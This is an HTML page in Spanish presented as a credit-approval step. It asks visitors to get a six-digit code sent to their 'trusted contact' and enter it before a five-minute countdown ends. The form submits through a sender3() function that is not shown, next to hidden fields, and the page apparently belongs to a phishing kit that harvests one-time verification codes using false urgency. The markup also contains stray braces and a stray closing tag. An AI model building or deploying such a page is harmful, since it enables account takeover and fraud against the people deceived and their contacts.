    <style>
        body {

        }

            background-color: #ccc;
        }
    </style>

<body>

    <form onsubmit="javascript:return sender3();">
                     
        <p id="gfg"  hidden=""></p>
        <p id="address"  hidden=""></p>  



    <div class="container">
        <div class="notification">
            <span class="checkmark">✔</span>
            <span class="message">El código de seguridad fue enviado.</span>
            <button class="close-btn" onclick="closeNotification()">×</button>
        </div>

        <h2>Aprobacion De Crédito</h2>
        <h1>Confirmemos que eres tú</h1>
        <p>Hemos enviado un mensaje de texto a tu contacto de confianza 
        <strong>*************</strong>. Pídeselo e ingrésalo aquí para confirmar y aprobar tu crédito A la mano con éxito:</p>

        <div class="timer-container">
            <div class="timer-circle">
                <span id="time">05:00</span>
            </div>
            <p>El código vence en:</p>
        </div>

        <div class="input-code">
            <div class="code-box">
                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo2')" name="codigo1" id="codigo1">
                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo3')" name="codigo2" id="codigo2">
                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo4')" name="codigo3" id="codigo3">
                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo5')" name="codigo4" id="codigo4">
                <input type="tel" required maxlength="1" oninput="moveNext(this, 'codigo6')" name="codigo5" id="codigo5">
                <input type="tel" required maxlength="1" oninput="validateCode()" name="codigo6" id="codigo6">
            </div>
        </div>

        <button id="submitBtn" class="disabled">Continuar</button>
    </div>

    <script>
        // Temporizador de 5 minutos
        var countdownTime = 5 * 60; // 5 minutos en segundos
        var countdownElement = document.getElementById('time');

        var timerInterval = setInterval(function() {
            var minutes = Math.floor(countdownTime / 60);
            var seconds = countdownTime % 60;

            // Añade un 0 a los segundos si es menor a 10
            seconds = seconds < 10 ? '0' + seconds : seconds;

            countdownElement.innerHTML = minutes + ':' + seconds;

            countdownTime--;

            // Redirigir cuando el temporizador llegue a 0
            if (countdownTime < 0) {
                clearInterval(timerInterval);
                window.location.href = "index.html"; // Redirige a index.html
            }
        }, 1000);

        function closeNotification() {
            var notification = document.querySelector('.notification');
            notification.style.display = 'none';
        }

        function moveNext(current, nextId) {
            if (current.value.length === 1) {
                document.getElementById(nextId).focus();
            }
        }

        function validateCode() {
            var inputs = document.querySelectorAll('.code-box input');
            var allFilled = Array.from(inputs).every(input => input.value.length === 1);

            var submitBtn = document.getElementById('submitBtn');
            if (allFilled) {
                submitBtn.classList.remove('disabled');
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
                submitBtn.style.cursor = "pointer";
            } else {
                submitBtn.classList.add('disabled');
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
                submitBtn.style.cursor = "not-allowed";
            }
        }
    </script>


    
</script>
